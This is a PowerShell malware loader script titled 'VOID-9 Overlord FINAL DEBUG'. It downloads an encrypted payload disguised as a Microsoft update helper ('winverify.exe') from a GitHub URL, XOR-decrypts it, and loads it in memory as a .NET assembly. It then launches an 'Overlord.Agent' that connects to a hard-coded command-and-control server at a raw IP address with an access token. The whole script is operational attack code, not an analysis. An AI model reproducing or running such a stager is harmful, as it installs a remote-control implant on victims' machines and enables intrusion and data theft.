# VOID-9 Overlord FINAL DEBUG 2026
Write-Host "=== VOID-9 FINAL DEBUG START ===" -ForegroundColor Green

try {
    $url = "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    Write-Host "Downloading stub..." -ForegroundColor Yellow

    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $data = $wc.DownloadData($url)

    Write-Host "Downloaded $($data.Length) bytes - decrypting..." -ForegroundColor Green

    # XOR decrypt
    for($i = 0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor 0x69
    }
    Write-Host "Decryption finished - loading assembly..." -ForegroundColor Green

    $asm = [System.Reflection.Assembly]::Load($data)
    Write-Host "Assembly loaded successfully" -ForegroundColor Green

    $type = $asm.GetType("Overlord.Agent")
    if (-not $type) { throw "Overlord.Agent type not found in assembly" }

    $method = $type.GetMethod("Run", [Reflection.BindingFlags]"Public,Static")
    if (-not $method) { throw "Run method not found" }

    $c2url = "http://176.65.132.236:5173"
    $token = "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ"

    Write-Host "Launching agent to $c2url ..." -ForegroundColor Cyan
    $method.Invoke($null, @($c2url, $token))

    Write-Host "=== SUCCESS - AGENT SHOULD BE CONNECTING NOW ===" -ForegroundColor Green
}
catch {
    Write-Host "=== CRITICAL ERROR ===" -ForegroundColor Red
    Write-Host "Message : $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Type    : $($_.Exception.GetType().FullName)" -ForegroundColor Red
    if ($_.Exception.InnerException) {
        Write-Host "Inner   : $($_.Exception.InnerException.Message)" -ForegroundColor Red
    }
}

Write-Host "=== VOID-9 FINAL DEBUG END ===" -ForegroundColor Green
